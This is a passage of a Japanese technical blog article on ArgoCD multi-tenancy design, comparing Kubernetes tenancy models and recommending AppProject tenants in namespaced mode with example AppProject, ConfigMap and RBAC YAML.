なぜマルチテナントが必要なのかシングルテナントの場合そもそも、なぜArgoCDにマルチテナントが必要なのでしょうか。例えば、マニフェストのデプロイ先となるプロダクト用Cluster (例：foo、bar、baz) があると仮定します。ArgoCDをシングルテナントにする場合、各プロダクトチームの操作するApplicationを同じテナントに共存させることになります。この場合、単一のargocd-server (ダッシュボード) から全てのApplicationを操作できて便利です。しかし、プロダクト用Cluster数が増えていくにつれて、問題が起こり始めます。例えば、いずれかのプロダクトチームが誤ったApplicationを操作し、結果的に誤ったプロダクト用Clusterにマニフェストをデプロイしてしまう可能性があります。もちろん、システムでインシデントを起こしてやろうという悪意を持った人が、誤ったプロダクト用Clusterを意図的に選ぶ可能性もあります\uD83D\uDE08マルチテナントの場合その一方で、いい感じのマルチテナントにしたとします。プロダクトチームは、認可されたテナントに所属するApplicationにのみを操作でき、反対に無認可のテナントのApplicationは操作できません。これにより、誤ったプロダクト用Clusterにマニフェストをデプロイすることを防げます。03. Kubernetesのマルチテナントパターンマルチテナントパターンの一覧ArgoCDのテナント設計を実践する前に、Kubernetesにはどんなマルチテナントパターンがあるのでしょうか。Kubernetesのマルチテナントパターンは、以下に大別できます。         Clustersas-a-Service         Control Planesas-a-Service         Namespacesas-a-Service         カスタムリソーステナント      テナント単位         実Cluster         仮想Cluster         Namespace         ツール固有の論理空間      テナント間でKubernetesリソースを分離できるか         Clusterスコープリソース         ✅         ✅         ✅         ツールによる      Namespacedスコープリソース         ✅         ✅                  ツールによる      ツール         AWS EKSGCP GKEAzure AKEKubeadmなど         Kcptensile-kubevclusterVirtualClusterなど         Namespaceを増やすだけなので特別なツール不要         ArgoCDのAppProjectCapsuleのTenantkioskのAccountKubeZooのTenantなど      ▶ 他のマルチテナントの分類方法について\\"ソフトマルチテナンシー\\" と \\"ハードマルチテナンシー\\" といった分類方法もあります。この分類方法では、テナント間の分離度の観点で各マルチテナントを種別します。ソフトマルチテナンシーは、互いに信頼できる前提の上で、テナント間を弱く分離します。その一方で、ハードマルチテナンシーは、互いに信頼できない前提の上でテナント間を強く分離します。分離度がソフトとハードのいずれであるかに客観的な指標がなく、やや曖昧な種別になってしまうため、本記事の X as-a-Service の方が個人的には好みです♡♡♡The Kubernetes Book: 2024 Edition (English Edition)Multi-tenancy | KubernetesMulti-tenancy - EKS Best Practices GuidesClusters as-a-ServiceClusters as-a-Serviceは、テナントごとに独立したClusterを提供します。ツールとして、AWS EKS、GCP GKE、Azure AKE、Kubeadmなどがあります。Three Tenancy Models For Kubernetes | KubernetesWhat are the three tenancy models for Kubernetes?Control Planes as-a-ServiceControl Planes as-a-Serviceは、テナントごとに独立したコントロールプレーン (言い換えば仮想Cluster) を提供します。ツールとして、Kcp、tensile-kube、vcluster、VirtualClusterなどがあります。Three Tenancy Models For Kubernetes | KubernetesWhat are the three tenancy models for Kubernetes?Namespaces as-a-ServiceNamespaces as-a-Serviceは、テナントごとに独立したNamespaceを提供します。Namespaceを増やすだけなため、ツールは不要です。Three Tenancy Models For Kubernetes | KubernetesWhat are the three tenancy models for Kubernetes?カスタムリソーステナントカスタムリソーステナントは、テナントごとにツール固有の論理空間 (例：ArgoCDのAppProject、CapsuleのTenant、kioskのAccount、KubeZooのTenantなど) を提供します。ツールによっては、X as-a-Service も兼ねている場合があります。今回紹介するAppProjectは、前述の『Namespace as-a-Service』を兼ねています。AppProjectについては、カスタムリソーステナント で解説しています。04. ArgoCDでのテナントパターン実践一覧お待たせしました。ここからは、KubernetesのマルチテナントパターンをArgoCDで具体的に実践し、おすすめのパターン実践を解説していきます。なお、オススメするものを ★ としています。         実Clusterテナント         仮想Clusterテナント         Namespaceテナント         AppProjectテナントCLモード         AppProjectテナントNSモード      対応するテナントパターン         Clustersas-a-Service         Control Planesas-a-Service         Namespacesas-a-Service         カスタムリソーステナント      ArgoCDがテナント間で占有 / 共有         占有         占有         占有         共有         占有      テナント間でKubernetesリソースを分離できるか         Namespacedスコープリソース         ✅         ✅         ✅         ✅         ✅      Clusterスコープリソース         ✅         ✅                                 オススメ                  ★                           ★★      How many do you need? Argo CD Architectures Explained - 2024 Update | Akuity以降の図の凡例です。ArgoCDの各コンポーネント (application-controller、argocd-server、dex-server、repo-server) と各リソース (Application、AppProject) を区別しています。04-02. Clusters as-a-Service 実践実Clusterテナント実Clusterテナントは、Clusters as-a-Serviceなテナントの実践であり、実際のClusterをテナントの単位とします。後述の仮想Clusterと対比させるために、\\"実Cluster\\" と呼ぶことにします。各プロダクトチームは、実Clusterテナント内のApplicationを操作し、正しいプロダクト用Clusterにマニフェストをデプロイします。オススメしない理由実Clusterテナントには、以下のメリデメがあります。デメリットの回避策も考慮して、独断と偏見でオススメしませんでした。半年以内にアップグレードしないとサポートが切れるKubernetesクラスターが33個もあって、泣いちゃった— 長谷川 広樹 (俺です) (@Hiroki__IT) January 18, 2023  アーキテクチャ特性  メリット ⭕️                                                                                                                                                           デメリット \xd7                                                                                    デメリットの回避策                                                                                  拡張性                 -                                                                                                                                                                     テナントを増やすために実Clusterを用意する必要があり、作業量が多い。                            ➡︎  IaCツールで実Clusterを用意するようにすれば作業量を減らせるが、やっぱりとてもつらい\uD83D\uDE2D       安全性(セキュリティ)        ClusterからClusterへの名前解決を不可能にすれば、他のテナントからの通信を遮断できる。                                                                                  -                                                                                              ➡︎  -                                                                                                   保守性                 ClusterスコープまたはNamespacedスコープなKubernetesリソースを他のテナントから分離できる。これらのKubernetesリソース (特にCRD) の変更が他のテナントに影響しない。  各テナントが、個別に実Clusterを保守しないといけない。(例：アップグレード、機能修正など)  ➡︎  回避できず、とてもつらい\uD83D\uDE2D                                                                           性能                  Clusterのハードウェアリソースを他のテナントと奪い合うことなく、これを独占できる。                                                                                     -                                                                                              ➡︎  -                                                                                                   信頼性                 テナントごとに実Clusterが独立しており、他の実Clusterから障害の影響を受けない。                                                                                        -                                                                                              ➡︎  -                                                                                    04-03. Control Planes as-a-Service 実践仮想Clusterテナント - ★仮想Clusterテナントは、Control Planes as-a-Serviceなテナントの実践であり、仮想Clusterをテナントの単位とします。各プロダクトチームは、仮想Clusterテナント内のApplicationを操作し、正しいプロダクト用Clusterにマニフェストをデプロイします。Using Argo CD with vclusters. Managing deployment to multiple… | by Daniel Helfand | Argo Projectオススメした理由仮想Clusterテナントには、以下のメリデメがあります。デメリットの回避策も考慮して、独断と偏見で オススメ しました。 アーキテクチャ特性  メリット ⭕️                                                                                                                                                           デメリット \xd7                                                                                             デメリットの回避策                                                                                    拡張性                 テナントを増やすためにマニフェストで定義した仮想Clusterを用意するだけでよく、実Clusterを用意することと比べて作業量が少ない。                                          -                                                                                                       ➡︎  -                                                                                            安全性(セキュリティ)        仮想ClusterからホストClusterへの名前解決を不可能にすれば、他のテナントからの通信を遮断できる。                                                                        -                                                                                                       ➡︎  -                                                                                                     保守性                 ClusterスコープまたはNamespacedスコープなKubernetesリソースを他のテナントから分離できる。これらのKubernetesリソース (特にCRD) の変更が他のテナントに影響しない。  各テナントが、個別に仮想Clusterを保守しないといけない。(例：アップグレード、機能修正など)  ➡︎  仮想Clusterに関する知見を持つ組織であれば、各テナントで保守できる。                                    性能                  -                                                                                                                                                                     Clusterのハードウェアリソースを他のテナントと奪い合うことになる。                                       ➡︎  多くの利用者が同時並行的にArgoCDを操作する状況になりにくければ、奪い合いも起こらない。                信頼性                 テナントごとに仮想Clusterが独立しており、他の仮想Clusterから障害の影響を受けない。                                                                                    -                                                                                                       ➡︎  -                                                                                      04-04. Namespaces as-a-Service 実践Namespaceテナントは、Namespaces as-a-Serviceなテナントの実践であり、Namespaceをテナントの単位とします。後述の AppProjectテナント は二重のテナントを持ち、Namespaceテナントも兼ねています。そのため、ここではNamespaceテナントの解説は省略します。04-05. カスタムリソーステナントの実践AppProjectテナントAppProjectテナントは、カスタムリソーステナントの実践であり、NamespaceとAppProjectをテナントの単位とします。AppProjectテナントは、二重のテナント (第一テナントにNamespace、第二テナントに複数のAppProject) を持ち、\\"あらゆる面から\\" マニフェストのデプロイを制限します。特に、AppProjectはNamespaceスコープなカスタムリソースであり、自身に所属するApplicationを一括して制限します。apiVersion: argoproj.io/v1alpha1kind: AppProjectmetadata:  name: foo-tenant  namespace: foo  # 自身に所属するApplicationを制限するspec: ...apiVersion: argoproj.io/v1alpha1kind: Applicationmetadata:  name: infra-application  namespace: foospec:  # foo-tenantに所属する  project: foo-tenant  ...Argo CD in Practice: The GitOps way of managing cloud-native applications (English Edition)Projects - Argo CD - Declarative GitOps CD for Kubernetes▶ カスタムリソースの仕様について.spec.scopeキーからも分かる通り、AppProjectはNamespacedスコープなカスタムリソースであり、任意のNamespaceを設定できます\uD83D\uDC4DapiVersion: apiextensions.k8s.io/v1kind: CustomResourceDefinitionmetadata:  labels:    app.kubernetes.io/name: appprojects.argoproj.io    app.kubernetes.io/part-of: argocd  name: appprojects.argoproj.iospec:  group: argoproj.io  names:    kind: AppProject    ...  # Namespacedスコープなカスタムリソースであるとわかる  scope: Namespaced...  argo-cd/manifests/crds/appproject-crd.yaml at master \xb7 argoproj/argo-cd \xb7 GitHubExtend the Kubernetes API with CustomResourceDefinitions | KubernetesCLモード vs. NSモードArgoCDには、Clusterスコープモード と Namespacedスコープモード (以降、\\"CLモード\\" と \\"NSモード\\") があります。スコープモードに応じて、AppProjectテナントの設計方法が異なります。本章では、CLモードとNSモードの両方でAppProjectテナントを解説していきます。Applications in any namespace - Argo CD - Declarative GitOps CD for Kubernetes05. CLモードなArgoCDCLモードなArgoCDとはCLモードなArgoCDの場合、各テナント間で共有のArgoCDを管理します例えば、AppProjectテナントとして、プロダクト別のNamespace (foo、bar、baz) とAppProject (foo、bar、baz) を用意します。別途、ArgoCD専用のNamespace (argocd) を用意し、ここに関連するKubernetesリソース (例：ConfigMap) を配置します。各プロダクトチームは、AppProjectテナント内のApplicationを操作し、正しいプロダクト用Clusterにマニフェストをデプロイします。Applications in any namespace - Argo CD - Declarative GitOps CD for KubernetesArgoCD: Multi-tenancy strategy. Introduction | by Geoffrey | MediumAppProjectNSモードと同様にして、AppProjectに所属するApplicationによるマニフェストのデプロイを制限できます。例えば、以下のような実装になります。apiVersion: argoproj.io/v1alpha1kind: AppProjectmetadata:  name: foo-tenant  namespace: foospec:  destinations:    # ArgoCD用Clusterに関する認可を設定する    # App Of Appsパターンの場合に使用する    - namespace: foo      server: \\"https://kubernetes.default.svc\\"    # プロダクト用Clusterに関する認可を設定する    - namespace: \\"*\\"      server: https://foo-cluster.gr7.ap-northeast-1.eks.amazonaws.com  # CLモードでは設定が必要である  sourceNamespaces:    - fooApplicationを操作するログインユーザーが、無認可のNamespaceやClusterをデプロイ先に指定できないように、.spec.destinationキーで制限しています。一方で後述のNSモードとは異なり、CLモードなArgoCDは任意のNamespaceのApplicationにアクセスできます。そのため、.spec.sourceNamespacesキーで、特定のNamespaceのApplicationがこのAppProjectに所属できないように、ApplicationのNamespaceを制限しています。Applications in any namespace - Argo CD - Declarative GitOps CD for KubernetesProjects - Argo CD - Declarative GitOps CD for KubernetesArgoCDコンポーネント用ConfigMap (argocd-cmd-params-cm)NSモードと同様にして、argocd-cmd-params-cmでは、ArgoCDの各コンポーネントのコンテナの引数を設定できます。例えば、以下のような実装になります。apiVersion: v1kind: ConfigMapmetadata:  name: argocd-cmd-params-cm  # 専用のNamespaceを設定する  namespace: argocddata:  # CLモードでは設定が必要である  # 全てのNamespaceを指定したい場合は、ワイルドカードを設定する  application.namespaces: \\"*\\".application.namespacesキーは、argocd-serverとapplication-controllerの--application-namespacesオプションに相当します。一方での後述のNSモードとは異なり、CLモードなArgoCDは任意のNamespaceのApplicationにアクセスできます。--application-namespacesオプションで、任意のNamespaceにアクセスするための認可を設定できます。Applications in any namespace - Argo CD - Declarative GitOps CD for Kubernetes▶ --application-namespacesオプションの設定方法についてargocd-cmd-params-cmの代わりに、例えば以下のようにPodに引数を直接渡しても良いです\uD83D\uDE46\uD83C\uDFFB‍例えば、以下のような実装になります。apiVersion: v1kind: Podmetadata:  name: argocd-server  namespace: argocdspec:  containers:    - name: argocd-server      image: quay.io/argoproj/argocd:latest      args:        - /usr/local/bin/argocd-server        # コンテナ起動時の引数として        - --application-namespaces=\\"*\\"  ...apiVersion: v1kind: Podmetadata:  name: argocd-application-controller  namespace: argocdspec:  containers:    - name: argocd-application-controller      image: quay.io/argoproj/argocd:latest      args:        - /usr/local/bin/argocd-application-controller        # コンテナ起動時の引数として        - --application-namespaces=\\"*\\"  ...  `argocd-application-controller` Command Reference - Argo CD - Declarative GitOps CD for Kubernetes`argocd-server` Command Reference - Argo CD - Declarative GitOps CD for Kubernetesログインユーザー用ConfigMap (argocd-rbac-cm)NSモードと同様にして、argocd-rbac-cmでは、Applicationを操作するログインユーザーが、無認可のAppProjectやNamespaceに所属するApplicationを操作できないように制限します。例えば、以下のような実装になります。apiVersion: v1kind: ConfigMapmetadata:  name: argocd-rbac-cm  # 専用のNamespaceを設定する  namespace: argocddata:  # デフォルトのロール  # @see https://github.com/argoproj/argo-cd/blob/master/assets/builtin-policy.csv#L9-L16  policy.default: role:readonly  policy.csv: |    p, role:foo, *, *, foo/*/*, allow    p, role:bar, *, *, bar/*/*, allow    p, role:baz, *, *, baz/*/*, allow    g, foo-team, role:foo    g, bar-team, role:bar    g, baz-team, role:baz  scopes: \\"[groups]\\"認証済みグループ (foo-team、bar-team、baz-team) に対して、無認可のAppProject (foo、bar、baz) に所属するApplicationを操作できないように、認可スコープを制限しています。▶ AppProjectの認可定義の記法についてCasbin の記法を使用します。今回の実装例で使用したp (パーミッション) とg (グループ) では、以下を記法を使用できます\uD83D\uDC4DapiVersion: v1kind: ConfigMapmetadata:  name: argocd-rbac-cm  namespace: argocddata:  policy.default: role:readonly  policy.csv: |    # ロールとArgoCD系カスタムリソースの認可スコープを定義する    p, role:<ロール名>, <Kubernetesリソースの種類>, <アクション名>, <AppProject名>/<ApplicationのNamespace名>/<Application名>, <許否>    # 認証済みグループにロールを紐付ける    g, <グループ名>, role:<ロール名>  scopes: \\"[groups]\\"RBAC Configuration - Argo CD - Declarative GitOps CD for Kubernetesオススメしない理由CLモードなArgoCDのAppProjectテナントには、以下のメリデメがあります。デメリットの回避策も考慮して、独断と偏見でオススメしませんでした。 アーキテクチャ特性  メリット ⭕️                                                                                  デメリット \xd7                                                                                                                                                                                                                      デメリットの回避策                                                                                                                                                            拡張性                 テナントを増やすためにNamespaceとAppProjectを用意するだけでよく、作業量が少ない。            -                                                                                                                                                                                                                                ➡︎  -                                                                                                                                                                    安全性(セキュリティ)        NetworkPolicyでNamespace間の名前解決を不可能にすれば、他のNamespaceからの通信を遮断できる。  -                                                                                                                                                                                                                                ➡︎  -                                                                                                                                                                             保守性                 ArgoCD用Clusterの管理者が単一のClusterを保守すればよい。(例：アップグレード、機能修正など)   AppProjectはNamespacedスコープなカスタムリソースのため、ClusterスコープなKubernetesリソースを他のテナントと共有しないといけない。そのため、ClusterスコープなKubernetesリソース (特にCRD) の変更は全てのテナントに影響する。  ➡︎  ArgoCDのアップグレード時 (CRDの変更時) は、ついでにKubernetesもアップグレードしたい。新しいClusterを別に作成し、そこで新ArgoCDを作成すれば一石二鳥である。                 性能                  -                                                                                            Clusterのハードウェアリソースを他のテナントと奪い合うことになる。                                                                                                                                                                ➡︎  多くの利用者が同時並行的にArgoCDを操作する状況になりにくければ、奪い合いも起こらない。                                                                                        信頼性                 -                                                                                            ClusterまたはArgoCDで障害が起こると、これは全てのテナントに影響する。                                                                                                                                                            ➡︎  代わりにNodeやArgoCDを十分に冗長化して可用性を高めれば、影響を緩和できる。ただ、そもそもの影響範囲が大きすぎる\uD83D\uDE2D                                           05-02. NSモードなArgoCD - ★★NSモードなArgoCDとはNSモードなArgoCDの場合、前述のCLモードとは異なり、各AppProjectテナント間でArgoCDを占有します。例えば、AppProjectテナントとして、プロダクト別のNamespace (foo、bar、baz) とAppProject (foo、bar、baz) を用意します。各AppProjectテナントに、ArgoCDと関連するKubernetesリソース (例：ConfigMap) を配置します。各プロダクトチームは、AppProjectテナント内のApplicationを操作し、正しいプロダクト用Clusterにマニフェストをデプロイします。Applications in any namespace - Argo CD - Declarative GitOps CD for KubernetesAppProjectCLモードと同様にして、AppProjectに所属するApplicationによるマニフェストのデプロイを制限できます。例えば、以下のような実装になります。apiVersion: argoproj.io/v1alpha1kind: AppProjectmetadata:  name: foo-tenant  namespace: foospec:  destinations:    # ArgoCD用Clusterに関する認可を設定する    # App Of Appsパターンの場合に使用する    - namespace: foo      server: \\"https://kubernetes.default.svc\\"    # プロダクト用Clusterに関する認可を設定する    - namespace: \\"*\\"      server: https://foo-cluster.gr7.ap-northeast-1.eks.amazonaws.com# NSモードでは設定が不要である# sourceNamespaces:#   - fooApplicationを操作するログインユーザーが、無認可のNamespaceやClusterをデプロイ先に指定できないように、.spec.destinationキーで制限しています。前述のCLモードとは異なり、NSモードなArgoCDは自身が所属するNamespaceのApplicationのみにアクセスできます。そのため、.spec.sourceNamespacesキーでマニフェストのデプロイを制限する必要はありません。Applications in any namespace - Argo CD - Declarative GitOps CD for KubernetesProjects - Argo CD - Declarative GitOps CD for KubernetesArgoCDコンポーネント用ConfigMap (argocd-cmd-params-cm)CLモードと同様にして、argocd-cmd-params-cmでは、ArgoCDの各コンポーネントのコンテナの引数を設定できます。例えば、以下のような実装になります。apiVersion: v1kind: ConfigMapmetadata:  name: argocd-cmd-params-cm  namespace: foodata:# NSモードでは設定が不要である# application.namespaces: \\"*\\"前述の通り、.application.namespacesキーは、argocd-serverとapplication-controllerの--application-namespacesオプションに相当します。前述のCLモードとは異なり、NSモードなArgoCDは自身が所属するNamespaceのApplicationのみにアクセスできますそのため、.application.namespacesキーでNamespaceに関する認可を設定する必要はありませんもちろん、Podのコンテナ引数にも設定は不要です。Applications in any namespace - Argo CD - Declarative GitOps CD for Kubernetesログインユーザー用ConfigMap (argocd-rbac-cm)CLモードと同様にして、argocd-rbac-cmでは、Applicationを操作するログインユーザーが、無認可のAppProjectやNamespaceに所属するApplicationを操作できないように制限します。例えば、以下のような実装になります。apiVersion: v1kind: ConfigMapmetadata:  name: argocd-rbac-cm  namespace: foodata:  # デフォルトのロール  # @see https://github.com/argoproj/argo-cd/blob/master/assets/builtin-policy.csv#L9-L16  policy.default: role:readonly  policy.csv: |    p, role:app, *, *, app/*/*, allow    p, role:infra, *, *, infra/*/*, allow    g, app-team, role:app    g, infra-team, role:infra  scopes: \\"[groups]\\"認証済みグループ (app-team、infra-team) に対して、無認可のAppProject (app、infra) に所属するApplicationを操作できないように、認可スコープを制限しています。特にオススメした理由NSモードなArgoCDのAppProjectテナントには、以下のメリデメがあります。デメリットの回避策も考慮して、独断と偏見で 特にオススメ しました。 アーキテクチャ特性  メリット ⭕️                                                                                  デメリット \xd7                                                                                                                                                                                                                      デメリットの回避策                                                                                                                                                            拡張性                 テナントを増やすためにNamespaceとAppProjectを用意するだけでよく、作業量が少ない。            -                                                                                                                                                                                                                                ➡︎  -                                                                                                                                                                    安全性(セキュリティ)        NetworkPolicyでNamespace間の名前解決を不可能にすれば、他のNamespaceからの通信を遮断できる。  -                                                                                                                                                                                                                                ➡︎  -                                                                                                                                                                             保守性                 単一のClusterを保守すればよい。(例：アップグレード、機能修正など)               AppProjectはNamespacedスコープなカスタムリソースのため、ClusterスコープなKubernetesリソースを他のテナントと共有しないといけない。そのため、ClusterスコープなKubernetesリソース (特にCRD) の変更は全てのテナントに影響する。  ➡︎  ArgoCDのアップグレード時 (CRDの変更時) は、ついでにKubernetesもアップグレードしたい。新しいClusterを別に作成し、そこで新ArgoCDを作成すれば一石二鳥である。                 性能                  -                                                                                            Clusterのハードウェアリソースを他のテナントと奪い合うことになる。                                                                                                                                                                ➡︎  多くの利用者が同時並行的にArgoCDを操作する状況になりにくければ、奪い合いも起こらない。                                                                                        信頼性                 テナントごとにArgoCDを占有しており、他のArgoCDから障害の影響を受けない。                     Clusterで障害が起こると、これは全てのテナントに影響する。                                                                                                                                                                        ➡︎  代わりに、Nodeを十分に冗長化して可用性を高める。いずれかのインスタンスで障害が起こっても、正常なインスタンスでArgoCDが稼働できる。                         AppProjectテナント例の一覧NSモードなArgoCDを採用する場合、AppProjectテナント例を解説していきます。前述の通り、AppProjectテナントが二重テナント (第一テナントにNamespace、第二テナントに複数のAppProject) を持つことに留意してください。なお、オススメするものを ★ としています。    テナント例(二重テナント)    オススメ  Namespace(第一テナント)    AppProject(第二テナント)  テナント例1      プロダクトの実行環境別      プロダクトの実行環境別          テナント例2      プロダクト別      プロダクトの実行環境別      ★    テナント例3      プロダクト別      プロダクトのサブチーム別      ★★    ▶ Namespaceの分割パターンについて\\"管理チーム別\\" (今回でいうプロダクト別) というNamespaceの分割パターンは、様々な著名な書籍やブログで紹介されています\uD83D\uDC40  https://www.amazon.co.jp/dp/1617293725Kubernetes best practices: Specifying Namespaces in YAML | Google Cloud Blogテナント例1Namespace (プロダクトの実行環境別)、AppProject (プロダクトの実行環境別)プロダクトの実行環境 (Dev環境、Tes環境) 別に管理されたClusterがいる状況と仮定します。この場合に、プロダクトの実行環境別にNamespace (dev、tes) とAppProject (dev、tes) を用意します。オススメしなかった理由テナント例1には、以下のメリデメがあります。独断と偏見でオススメしませんでした。 アーキテクチャ特性  メリット ⭕️                                                                                                                                     デメリット \xd7                                                                                                                                   デメリットの回避策                                                                                       拡張性                 -                                                                                                                                               ArgoCDのPod数が多くなり、将来的にNode当たりのPodやIPアドレスの上限数にひっかかりやすい。その時点で、AppProjectテナントの増やせなくなる。  ➡︎  例えばAWS EKSの場合、Node数を増やしたり、Nodeのスペックを上げる。ただ、お金がかかる\uD83D\uDE2D       安全性(セキュリティ)        ログインユーザー用ConfigMap (argocd-rbac-cm) を使用すれば、無認可の実行環境別AppProjectに所属するApplicationを操作できないように制限できる。  -                                                                                                                                             ➡︎  -                                                                                                        保守性                 異なる実行環境に関するApplicationが共存しておらず、別のargocd-serverから操作することになるため、実行環境間の選択ミスが起こりにくい。            -                                                                                                                                             ➡︎  -                                                                                         テナント例2 - ★Namespace (プロダクト別)、AppProject (プロダクトの実行環境別)プロダクトの実行環境 (Dev環境、Tes環境) 別に管理されたClusterがいる状況と仮定します。プロダクト別にNamespace (foo、bar) 、プロダクトの実行環境別にAppProject (dev、tes) を用意します。オススメした理由テナント例2には、以下のメリデメがあります。独断と偏見で オススメ しました。 アーキテクチャ特性  メリット ⭕️                                                                                                                デメリット \xd7                                                                                                                                           デメリットの回避策                                                                                 拡張性                 ArgoCDのPod数が多くなり、将来的にNode当たりのPodやIPアドレスの上限数にひっかかりにくい。                                   -                                                                                                                                                     ➡︎  -                                                                                         安全性(セキュリティ)        ログインユーザー用ConfigMap (argocd-rbac-cm) を使用すれば、無認可の実行環境別AppProjectを操作できないように制限できる。  -                                                                                                                                                     ➡︎  -                                                                                                  保守性                 -                                                                                                                          異なる実行環境に関するApplicationが共存しており、同じargocd-server (ダッシュボード) から操作することになるため、実行環境間の選択ミスが起こりやすい。  ➡︎  ダッシュボードにはApplicationのフィルタリング機能があるため、選択ミスを回避できる。 テナント例3 - ★★Namespace (プロダクト別)、AppProject (プロダクトのサブチーム別)プロダクトの実行環境 (Dev環境、Tes環境) 別に管理されたClusterがいる状況と仮定します。プロダクト別にNamespace (foo、bar) 、プロダクトのサブチーム別にAppProject (app、infra) を用意します。特にオススメした理由テナント例3には、以下のメリデメがあります。独断と偏見で 特にオススメ しました。 アーキテクチャ特性  メリット ⭕️                                                                                                                                       デメリット \xd7                                                                                                                                           デメリットの回避策                                                                                 拡張性                 ArgoCDのPod数が多くなり、将来的にNode当たりのPodやIPアドレスの上限数にひっかかりにくい。                                                          -                                                                                                                                                     ➡︎  -                                                                                         安全性(セキュリティ)        ログインユーザー用ConfigMap (argocd-rbac-cm) を使用すれば、無認可のサブチーム別AppProjectに所属するApplicationを操作できないように制限できる。  -                                                                                                                                                     ➡︎  -                                                                                                  保守性                 -                                                                                                                                                 異なる実行環境に関するApplicationが共存しており、同じargocd-server (ダッシュボード) から操作することになるため、実行環境間の選択ミスが起こりやすい。  ➡︎  ダッシュボードにはApplicationのフィルタリング機能があるため、選択ミスを回避できる。 06. どのような誤った操作を防いでくれるのかそろそろ解説を読むのがしんどい方がいるのではないでしょうか。『君がッ、泣くまで、解説をやめないッ！』AppProjectテナントとNamespacedスコープモードがマニフェストのデプロイをどのように制限するのかについて、例を挙げて解説します。ここでは、以下のAppProjectを作成したと仮定します。AppProjectテナントが二重テナント (第一テナントにNamespace、第二テナントに複数のAppProject) を持つことに留意してください。apiVersion: argoproj.io/v1alpha1kind: AppProjectmetadata:  # appチーム  name: app  namespace: foospec:  destinations:    # ArgoCD用Clusterに関する認可を設定する    # Namespace (foo) へのデプロイを許可する    - namespace: foo      server: \\"https://kubernetes.default.svc\\"      # プロダクト用Clusterに関する認可を設定する      # Namespace (app) へのデプロイを許可する    - namespace: app      server: https://foo-cluster.gr7.ap-northeast-1.eks.amazonaws.comapiVersion: argoproj.io/v1alpha1kind: AppProjectmetadata:  # infraチーム  name: infra  namespace: foospec:  destinations:    # ArgoCD用Clusterに関する認可を設定する    # Namespace (foo) へのデプロイを許可する    - namespace: foo      server: \\"https://kubernetes.default.svc\\"    # プロダクト用Clusterに関する認可を設定する    # Namespace (infra) へのデプロイを許可する    - namespace: infra      server: https://foo-cluster.gr7.ap-northeast-1.eks.amazonaws.comマニフェストのデプロイ制限プロダクトの実行環境 (Dev環境、Tes環境) 別に管理されたClusterがいる状況と仮定します。プロダクト別にNamespace (foo) 、プロダクトのサブチーム別にAppProject (app、infra) を用意します。AppProjectテナントは、例えば 赤線 の方法で、マニフェストのデプロイを制限します。マニフェストをデプロイできる場合マニフェストを正しくデプロイする場合、AppProjectテナントはこれを制限しません。(1) argocd-serverは、argocd-cmd-params-cmからアクセスできるNamespaceを取得します。apiVersion: v1kind: ConfigMapmetadata:  name: argocd-cmd-params-cm  namespace: foodata:# 設定しないことで、argocd-serverは同じNamespaceにしかアクセスできなくなる。# application.namespaces: \\"*\\"(2) fooプロダクトのinfraチームが、argocd-serverを操作します。(3) argocd-serverは、argocd-rbac-cmからApplication操作に関する認可スコープを取得しますapiVersion: v1kind: ConfigMapmetadata:  name: argocd-rbac-cm  namespace: foodata:  policy.default: role:readonly  policy.csv: |    p, role:app, *, *, app/*/*, allow    p, role:infra, *, *, infra/*/*, allow    g, app-team, role:app    g, infra-team, role:infra  scopes: \\"[groups]\\"(4) infraチームは、認可されたAppProjectに所属するApplicationを操作します。(5) infraチームは、Dev環境のfooプロダクト用ClusterのNamespace (infra) にマニフェストをデプロイできます。(\uD83D\uDEAB制限例1) 無認可のNamespaceでApplicationを作成しようとした場合例えば、fooプロダクトのinfraチームが無認可のNamespace (bar) でApplicationを作成しようとします。すると、argocd-serverは以下のようなエラーを返却し、この操作を制限します。namespace bar is not permitted in project \'infra-team\'無認可のNamespaceでApplicationを作れてしまうと、そのApplicationから無認可のプロダクト用Clusterにマニフェストをデプロイできてしまいます\uD83D\uDE08argo-cd/test/e2e/app_management_ns_test.go at v2.7.10 \xb7 argoproj/argo-cd \xb7 GitHub(\uD83D\uDEAB制限例2) 無認可のAppProjectでApplicationを作成しようとした場合例えば、fooプロダクトのinfraチームが、無認可のAppProject (app) でApplicationを作成しようとします。すると、argocd-serverは以下のようなエラーを返却し、この操作を制限します。Application referencing project \'app\' which does not exist任意のAppProjectでApplicationを作成できてしまうと、そのApplicationから無認可のプロダクト用Clusterにマニフェストをデプロイできてしまいます\uD83D\uDE08(\uD83D\uDEAB制限例3) 無認可のClusterをデプロイ先に指定しようとした場合例えば、fooプロダクトのinfraチームがApplicationを操作し、無認可のプロダクト用Cluster (bar-cluster) をデプロイ先として指定しようします。すると、argocd-serverは以下のようなエラーを返却し、この操作を制限します。application destination{https://bar-cluster.gr7.ap-northeast-1.eks.amazonaws.com infra} is not permitted in project \'infra-team\'任意のClusterをデプロイ先に指定できてしまうと、Applicationから無認可のプロダクト用Clusterにマニフェストをデプロイできてしまいます\uD83D\uDE08argo-cd/util/argo/argo_test.go at v2.7.10 \xb7 argoproj/argo-cd \xb7 GitHub(\uD83D\uDEAB制限例4) 無認可のNamespaceをデプロイ先に指定しようとした場合例えば、fooプロダクトのinfraチームがApplicationを操作し、無認可のNamespace (app) をデプロイ先に指定しようします。すると、argocd-serverは以下のようなエラーを返却し、この操作を制限します。application destination{https://foo-cluster.gr7.ap-northeast-1.eks.amazonaws.com app} is not permitted in project \'infra-team\'任意のNamespaceをデプロイ先に指定できてしまうと、そのApplicationから無認可のNamespaceにマニフェストをデプロイできてしまいます\uD83D\uDE08argo-cd/util/argo/argo_test.go at v2.7.10 \xb7 argoproj/argo-cd \xb7 GitHub▶ AppProjectで設定できる認可の種類についてargocd-serverとapplication-controllerでデプロイできるKubernetesリソースの種類 (.spec.clusterResourceWhitelistキー、.spec.namespaceResourceWhitelistキーなど)repo-serverでポーリングできるリポジトリ (.spec.sourceReposキー)apiVersion: argoproj.io/v1alpha1kind: AppProjectmetadata:  name: foo-tenant  namespace: foospec:  clusterResourceWhitelist:    - group: \\"*\\"      kind: \\"*\\"  namespaceResourceWhitelist:    - group: \\"*\\"      kind: \\"*\\"  sourceRepos:    - \\"*\\"  ...\\"AppProjectテナントによるマニフェストのデプロイ丸ごとの制限\\" という観点でテーマが異なるため、本記事では言及しませんでした\uD83D\uDE47\uD83C\uDFFB‍  Projects - Argo CD - Declarative GitOps CD for KubernetesDeclarative Setup - Argo CD - Declarative GitOps CD for KubernetesカスタムリソースのReconciliation制限プロダクトの実行環境 (Dev環境、Tes環境) 別に管理されたClusterがいる状況と仮定します。プロダクト別にNamespace (foo) 、プロダクトのサブチーム別にAppProject (app、infra) 